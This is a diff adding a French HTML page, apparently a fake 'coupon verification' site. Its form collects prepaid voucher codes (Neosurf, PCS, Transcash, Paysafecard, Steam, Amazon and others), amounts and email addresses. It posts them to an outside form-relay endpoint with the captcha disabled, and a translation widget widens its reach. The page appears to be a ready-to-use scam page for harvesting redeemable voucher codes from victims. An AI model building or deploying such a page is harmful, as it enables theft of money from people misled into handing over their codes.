@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VYGC</title>
+
+    <!-- Fonts & Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link rel="stylesheet" href="css/stylefooter.css">
+    <link rel="stylesheet" href="css/styleform.css">
+
+    <link rel="icon" href="imgs/logo.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="imgs/logo.ico" type="image/x-icon">
+
+    <style>
+        .translate-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 100;
+        }
+
+        .goog-te-banner-frame.skiptranslate {
+            display: none !important;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-image: url('assets/imgs/bg-image.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            min-height: 100vh;
+            top: 0 !important;
+        }
+
+        .body-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 40px 20px;
+            box-sizing: border-box;
+            background-color: rgba(0, 0, 0, 0.5);
+            color: white;
+        }
+
+        .translate-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #1abc9c;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .translate-btn:hover {
+            background: #16a085;
+        }
+
+        .goog-logo-link,
+        .goog-te-gadget span {
+            display: none !important;
+        }
+
+        .body-form form {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .body-form form h2 {
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        /* Small logo inside form */
+        .form-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .form-logo img {
+            width: 70px;
+            height: auto;
+        }
+
+        .body-form label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .body-form input,
+        .body-form select {
+            width: 100%;
+            padding: 8px 12px;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            border: none;
+        }
+
+        .body-form input[type="submit"],
+        .body-form input[type="button"] {
+            background: #1abc9c;
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .body-form input[type="submit"]:hover,
+        .body-form input[type="button"]:hover {
+            background: #16a085;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Google Translate widget -->
+    <div class="translate-container">A
+        <div class="translate-btn">
+            🌐 Language
+            <div id="google_translate_element"></div>
+        </div>
+    </div>
+
+    <!-- Form Section -->
+    <div class="body-form">
+        <form id="sendmail" method="post"  action="https://connect.kitoform.com/f/3c12457fdffa">
+            <input type="hidden" name="_subject" value="Nouvelle Vérification (Verification.vercel.app)">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="text" name="_honey" style="display:none">
+            <input type="hidden" name="_template" value="table">
+
+            <h2>Veuillez entrer les informations du coupon ici.</h2>
+
+            <!-- Small Logo After Heading -->
+            <div class="form-logo">
+                <img src="data:image/jpeg;base64,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" alt="VYGC Logo">
+            </div>
+
+            <label for="type">Choisir une recharge *</label>
+            <select id="type" name="type">
+                <option value="none" selected disabled>---- Recharge ----</option>
+                <option value="NEOSURF">NEOSURF</option>
+                <option value="PCS">PCS</option>
+                <option value="TRANSCASH">TRANSCASH</option>
+                <option value="PAYSAFECARD">PAYSAFECARD</option>
+                <option value="GOOGLE PLAY">GOOGLE PLAY</option>
+                <option value="STEAM">STEAM</option>
+                <option value="FLEXEPIN">FLEXEPIN</option>
+                <option value="CASHLIB">CASHLIB</option>
+                <option value="NETFLIX">NETFLIX</option>
+                <option value="AMAZON">AMAZON</option>
+            </select>
+
+            <label for="montant">Montant de la recharge *</label>
+            <input type="text" name="montant" id="montant" placeholder="0">
+
+            <label for="devise">Choisir une devise *</label>
+            <select id="devise" name="devise">
+                <option value="none" selected disabled>---- Devise -----</option>
+                <option value="EURO €">EURO (€)</option>
+                <option value="Dollar $">Dollar ($)</option>
+                <option value="Dollard CHF">FRANC SUISSE (CHF)</option>
+            </select>
+
+            <label for="code1">Entrez les codes de recharge</label>
+            <input type="text" id="code1" name="code1" placeholder="Entrez le code de la recharge 1">
+            <input type="text" id="code2" name="code2" placeholder="Entrez le code de la recharge 2">
+            <input type="text" id="code3" name="code3" placeholder="Entrez le code de la recharge 3">
+            <input type="text" id="code4" name="code4" placeholder="Entrez le code de la recharge 4">
+
+
+ <label for="email">Entrez votre email</label>
+<input type="email" id="email" name="email" placeholder="Entrez votre email">
+            <!-- <input id="btncrypt" type="button" value="Crypter mes données"> -->
+            <input id="valider" type="submit" value="Valider">
+        </form>
+    </div>
+
+    <!-- Footer -->
+    <section class="footer">
+        <!-- existing footer code -->
+    </section>
+
+    <!-- Scripts -->
+    <script src="js/jquery.min.js"></script>
+    <script src="js/script.js"></script>
+
+    <script>
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+                pageLanguage: 'fr',
+                includedLanguages: 'en,fr,es,de,it,pt,ar',
+                layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+            }, 'google_translate_element');
+        }
+    </script>
+    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+</body>
+</html>
